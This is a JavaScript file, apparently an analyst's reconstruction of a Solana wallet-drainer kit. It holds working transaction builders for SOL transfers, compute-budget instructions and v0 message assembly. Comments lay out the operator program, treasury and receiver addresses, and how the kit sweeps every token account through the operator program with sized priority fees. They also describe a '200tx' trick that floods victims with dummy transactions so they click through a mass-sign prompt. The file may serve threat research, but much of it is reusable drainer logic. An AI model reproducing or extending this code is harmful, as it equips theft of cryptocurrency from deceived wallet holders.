/**
 * Drain transaction builders.
 *
 * Recovered from the reference bundle on 2026-11-11. These are the
 * instructions the victim is tricked into signing. The kit does NOT use
 * the Solana system/token programs for the drain itself: it calls the
 * operator's own on-chain program.
 *
 * Program and address constants (bundle globals):
 *   尫  11111111111111111111111111111111   SystemProgram
 *   窽  ComputeBudget111111111111111111111111111111  ComputeBudget
 *   顨  TwrGADB9QPrLfTKpWuyq9tjgRaGsuzgRUMFTz51uhsa  OPERATOR PROGRAM
 *        (string-table address; 蓧 and 娡 are aliases of it)
 *   銻  ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL  ATA program
 *   銷  TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA  SPL Token
 *   橁  TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb  Token-2022
 *   襗  So11111111111111111111111111111111111111112  wSOL mint
 *   豣  DvTqmF7uMbLaW56QsMvcgv8KSkydFEikuk5gUcjACPV  treasury
 *        (assessed; holds 17,057 SOL + 1.02M USDC on 2026-11-11)
 *   巢  6cwsqBqmRy22Qa2SEuZ8tWrpKoCS9M8S2r8ct8VuqFmj  receiver (b64 in table)
 *   蝧  4QFiKg8ejx5LfqqLNbnKsiCnbEgRtgakBF6abMrkquKW  receiver (b64 in table)
 *   粧  4cfdFcVuJf8PPXpMWPMCDehSE4gV4C8oYwpZnLra7rtW  drain-through
 *   昆  syspv6Qe5BbK8GPEjLbMnmF9hZy7juAuePbuspciCFP   drain-through
 *   孨  "hexfomo.fun"  kit-vendor watermark
 *
 * Instruction shapes (data layouts verified against the bundle):
 */

// 鷷: plain SOL transfer (used for the 1-lamport dummy and SOL drains).
// data = 12 bytes: u32 LE discriminator 2 (Transfer) + u64 LE lamports.
// accounts: [{from, r:3 (signer+writable)}, {to, r:1 (writable)}]
function solTransfer(from, to, lamports) {
  const data = new Uint8Array(12);
  data[0] = 2; // u32 LE, rest of the 4 bytes stay 0
  writeU64(data, BigInt(lamports), 4);
  return { d: SYSTEM_PROGRAM, data, f: [{ e: from, r: 3 }, { e: to, r: 1 }], v: 150 };
}

// 棵: ComputeBudget SetComputeUnitLimit. data = [2, u32 LE units].
function computeUnitLimit(units) {
  const data = new Uint8Array(5);
  data[0] = 2;
  writeU32(data, units, 1);
  return { d: COMPUTE_BUDGET, data, v: 150 };
}

// 榿: ComputeBudget SetComputeUnitPrice. data = [3, u64 LE microlamports].
function computeUnitPrice(microlamports) {
  const data = new Uint8Array(9);
  data[0] = 3;
  writeU64(data, BigInt(microlamports), 1);
  return { d: COMPUTE_BUDGET, data };
}

// 捅 / 溞 / 繠 / 弃: calls into the operator program 顨 with a
// single-byte discriminator. What each discriminator does lives in the
// on-chain program, not in this bundle; the kit treats the program as
// the drain engine (token sweeps go through it).
//   捅  data [2]   accounts [{a0, r:2}, ...]
//   溞  data [3]   accounts [{a0, r:3}, ...]
//   繠  data [4]   accounts [{a1, r:1}, ...]
//   弃  data [18]  accounts [{a0, r:0}, ...]

// 鄇 / 窳: PDA derivation (bump 255 down, createProgramAddress).
// 髂: ATA derivation against 銻, token program 銷 or 橁 (Token-2022
//     when the mint is Token-2022).
// 遦 / 發: "vault" PDA seeds against 顨 — the operator program keeps
//     per-victim/vault PDAs: seeds ["vault", sha256-ish of wallet].

// 权: assemble a v0 message: feePayer -> instructions -> optional
// program-dedupe -> recent blockhash from global state (信) -> finalize.
function buildTransaction(feePayer, instructions, dedupeSet) {
  return assembleMessage({ version: 0 })
    .setFeePayer(feePayer)          // 崆
    .addInstructions(instructions)  // 遀
    .dedupePrograms(dedupeSet)      // 緂 (optional)
    .applyBlockhash(globalState())  // 嵀
    .finalize();                    // 鲋
}

/**
 * Assembly of the real drain (method Xn and helpers 佉 / 柈 / 曗 / 鲢):
 *
 * - For every token account the victim holds, 柈 builds a drain chunk
 *   {gt: operator, Je: token account, Gt, vt: 粧 (drain-through),
 *    ce: optional [ATA program, mint]}; each chunk adds 5,000 compute.
 * - The instruction list is prepended with computeUnitLimit(units) and
 *   computeUnitPrice(price), a 鲢("|1"/"|0") marker instruction, and the
 *   chunks (曗). units = base (拁.騎) + 300 per queued account; the
 *   priority fee is 拁.磏 if set, else 0.5 (脵) x the estimated fee;
 *   price = ceil(feeLamports / units * 1e6) microlamports.
 * - Per token-program/account type, extra compute: id 8 -> +10,000,
 *   id 3 -> +615,000 (ATA creation), id 9 -> +20,300, id 17 -> +15,000,
 *   id 19 -> +100,000, id 15 -> -1,488,440.
 * - Caps: 柳 = 8,000,000 units; 綾 = 1,400,000; 惛 = 100 (account cap);
 *   鐘 = 432,000 (blockhash/validity window); 鲽 = 0.2 and 脵 = 0.5 are
 *   sizing factors for auto fee/amount math.
 * - Token drains go through 飗 (operator-program transfer); if that
 *   yields nothing, it falls back to a plain SOL transfer (鷷).
 *
 * Dummy-transaction spam (the "200tx" trick, matches 200tx.webm):
 * when the flow says ue == 2, the kit builds up to
 * Array(201 - n).fill(emptyTx) nearly-empty transactions (just
 * [computeUnitLimit(1000), computeUnitPrice(1000n)], or a 1-lamport
 * transfer to the treasury 豣) so the wallet shows a mass-sign prompt
 * and the victim clicks through all of them.
 */

